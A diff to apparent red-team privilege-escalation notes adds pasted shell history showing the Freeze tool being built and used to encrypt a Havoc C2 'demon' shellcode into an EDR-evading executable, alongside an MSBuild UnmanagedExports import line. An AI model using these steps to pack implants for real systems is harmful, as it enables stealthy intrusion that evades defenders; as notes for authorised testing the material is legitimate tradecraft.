@@ -1,9 +1,5 @@
 # Additional PrivEsc
 
-
-
-
-
 # SCHEDULED TASKS
 
 ```powershell
@@ -115,4 +111,26 @@ edit .csproj and replace the nuget line
 
 ```xml
 <Import Project="$(MSBuildProjectDirectory)\packages\UnmanagedExports.1.2.7\tools\RGiesecke.DllExport.targets" Condition="Exists('$(MSBuildProjectDirectory)\packages\UnmanagedExports.1.2.7\tools\RGiesecke.DllExport.targets')" />
+```
+
+# OPTIVE FREEZE
+
+```bash
+sudo git clone https://github.com/Tylous/Freeze.git
+   81  ls
+   82  cd Freeze
+   83  go build Freeze.go
+   84  sudo go build Freeze.go
+   85  ls
+   86  ./Freeze
+   87  ./Freeze -I /opt/Havoc/payloads/demon.x64.bin -encrypt -O /opt/Havoc/payloads/demon.frozen.x64.exe
+   88  sudo ./Freeze -I /opt/Havoc/payloads/demon.x64.bin -encrypt -O /opt/Havoc/payloads/demon.frozen.x64.exe
+   89  go install mvdan.cc/garble@latest
+   90  sudo ./Freeze -I /opt/Havoc/payloads/demon.x64.bin -encrypt -O /opt/Havoc/payloads/demon.frozen.x64.exe
+   91  sudo ./Freeze -I /opt/Havoc/payloads/demon.x64.bin -encrypt -O demon.frozen.x64.exe
+   92  go get golang.org/x/sys/windows
+   93  sudo go get golang.org/x/sys/windows
+   94  ls
+   95  sudo ./Freeze -I /opt/Havoc/payloads/demon.x64.bin -encrypt -O demon.frozen.x64.exe
+   96  ls -lah
 ```
